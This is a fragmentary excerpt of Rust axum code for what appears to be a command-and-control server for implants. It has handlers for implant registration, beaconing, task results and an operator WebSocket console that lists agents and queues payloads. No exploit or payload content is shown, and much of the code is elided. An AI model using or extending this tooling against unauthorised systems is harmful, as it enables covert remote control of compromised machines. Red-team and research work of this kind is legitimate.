...
use axum::{
    ...
    Json, 
    extract::{State,rejection,ws::{Message,WebSocket,WebSocketUpgrade,CloseFrame}},
};
...
async fn implant_register(State(state):State<Arc<AgentState>>,payload:Result<Json<AgentPayload>,JsonRejection>)->Result<(StatusCode,Json<Uuid>),StatusCode>
{
    ...
    match payload {
        Ok(Json(data)) => {
            ...
            if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Implant {} has registered!",new_uuid_global.to_string()).into())){
...
// #[axum::debug_handler]
async fn implant_result(State(state):State<Arc<AgentState>>,payload:Result<Json<Task>,JsonRejection>)->StatusCode
{
    match payload {
        ...
        Ok(Json(task)) => {
            ...
            if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Task {} result is available!",output_id).into())){
...
// #[axum::debug_handler]
async fn implant_beacon(State(state):State<Arc<AgentState>>, body:String)->Result<(StatusCode,Json<Vec<Task>>),StatusCode>
{
    // println!("beacon accessed");
    //TODO: Extract agent UUID from custom header
    let agent_uuid={
        match Uuid::parse_str(&body)
        {
            Ok(uuid)=>{uuid}
            Err(_)=>{return Err(StatusCode::UNAUTHORIZED);}
        }
    };
     //PLACEHOLDER CODE for extracted agent uuid
...
async fn ws_handler(
    ...
    //TODO: handle websockets authentication by extracting token from Authorization header here?
                ...
                match ServerCommands::try_from(t.as_str()){
                    ...
                    Ok(ServerCommands::GetAgent(id))=>{
                        ...
                        let (
                            ...
                            let _ =mailbox_tx.send(Message::Text("Error finding agent!".into())).await;
                            continue;
                        };
                        let agent_info={
                        ...
                        if let Ok(json)=agent_json{
                            let _ =mailbox_tx.send(Message::Text(format!("Agent {id}: {json}").into())).await;
                        };
                    }
                    Ok(ServerCommands::GetAgents)=>{
                        ...
                        if let Ok(json)=json_output{
                            let _ =mailbox_tx.send(Message::Text(format!("Agent ID List: {}",json).into())).await;
                        };
                    }
                    Ok(ServerCommands::GetTask(id))=>{
                        //add task to the mailbox queue
                        //TODO: establish an efficient way to lookup tasks
                        let _ =mailbox_tx.send(Message::Text("WIP, please use GetAgents to view all tasks for now.".into())).await;
                    }
                    Ok(ServerCommands::Payload(payload))=>{
                        //TODO: if current_agent is still String::new(), stop and force them to switch to an actual agent
                        if (current_agent.is_empty())
                        {
                            //Does the entire websockets connection need to be shut down if this fails?
                            let _ =mailbox_tx.send(Message::Text("Switch Agent: Please switch to a valid agent!".into())).await;
                            continue;
                        }
                        else 
                        {
                            ...
                            if let Some(task_queue)=agent_task_queue{
                                ...
                                let _ =mailbox_tx.send(Message::Text("Task queue not found".into())).await;
                            }
                        }
                    ...
                    Err(_)=>{
                        ...
                        let _ =mailbox_tx.send(Message::Text("Command invalid!".into())).await;
                    }
                }
            }
